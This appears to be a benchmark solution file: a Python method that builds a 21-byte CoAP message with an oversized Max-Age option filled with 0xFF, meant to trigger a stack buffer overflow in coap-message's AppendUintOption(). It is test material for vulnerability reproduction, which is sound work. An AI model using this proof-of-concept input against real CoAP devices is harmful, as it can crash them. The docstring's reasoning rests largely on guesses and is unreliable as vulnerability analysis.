import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a Stack Buffer Overflow
        in the AppendUintOption() function of coap-message.

        The vulnerability is a stack buffer overflow in `AppendUintOption`.
        Based on analysis of a similar vulnerability (CVE-2021-34449 in OpenThread),
        the overflow happens when a local buffer `buf[4]` is written beyond its
        bounds. This write is performed in a loop from `0` to `length-1`.
        The overflow is triggered if `length` can be made larger than 4.

        The `length` is calculated based on the integer value of the option.
        The existence of the vulnerability implies that a specific integer value
        can cause the `length` calculation to produce a result greater than 4.

        The ground-truth PoC length is 21 bytes. This strongly suggests the PoC is a
        crafted CoAP message that, when parsed by a test harness, will call
        `AppendUintOption` with a malicious integer value. A minimal CoAP message
        has a 4-byte header, leaving 17 bytes for options.

        We can construct a single option that is 17 bytes long (header + value).
        This allows us to pass a long, potentially malicious value. A CoAP option's
        length can be extended. We create an option with a 14-byte value, which
        requires a 3-byte option header.
        Total length = 4 (CoAP Hdr) + 3 (Opt Hdr) + 14 (Opt Value) = 21 bytes.

        We choose a `uint` option, like Max-Age (option number 14), to ensure the
        harness calls `AppendUintOption`.

        - CoAP Header: 4 bytes (e.g., CON GET, msgid=0x1234).
        - Option Header: 3 bytes for Delta=14, Length=14.
          - Option Delta: 14. This is the first option, so delta from 0 is 14.
            Since 14 >= 13, we use an extended format.
            Delta nibble = 13, Extended Delta byte = 14 - 13 = 1.
          - Option Length: 14.
            Since 14 >= 13, we use an extended format.
            Length nibble = 13, Extended Length byte = 14 - 13 = 1.
          - First byte: (delta_nibble << 4) | len_nibble = (13 << 4) | 13 = 0xDD.
          - Second byte: Extended Delta = 0x01.
          - Third byte: Extended Length = 0x01.
          - Resulting Option Header = b'\xdd\x01\x01'.
        - Option Value: 14 bytes.
          A common trigger for integer-related vulnerabilities is a value with all
          bits set, `0xFFFFFFFF`. The parser will likely read the first 4 bytes of
          our 14-byte value. We fill the entire value with `0xFF`.
        """

        # CoAP Header: Version 1, Type CON, TKL 0, Code GET, MsgID 0x1234
        header = b'\x40\x01\x12\x34'

        # Option: Delta=14 (Max-Age), Length=14
        delta = 14
        length = 14

        # Extended format for delta
        delta_nibble = 13
        ext_delta = delta - 13

        # Extended format for length
        len_nibble = 13
        ext_len = length - 13

        # First byte contains delta and length nibbles
        option_header = bytes([(delta_nibble << 4) | len_nibble])
        # Following bytes for extended delta and length
        option_header += bytes([ext_delta])
        option_header += bytes([ext_len])

        # The parser will likely take the first 4 bytes for the uint32_t value.
        # We use 0xFFFFFFFF, a common trigger value for integer vulnerabilities.
        payload = b'\xff' * 14

        poc = header + option_header + payload
        
        # Final PoC length check: 4 (header) + 3 (option header) + 14 (payload) = 21 bytes.
        return poc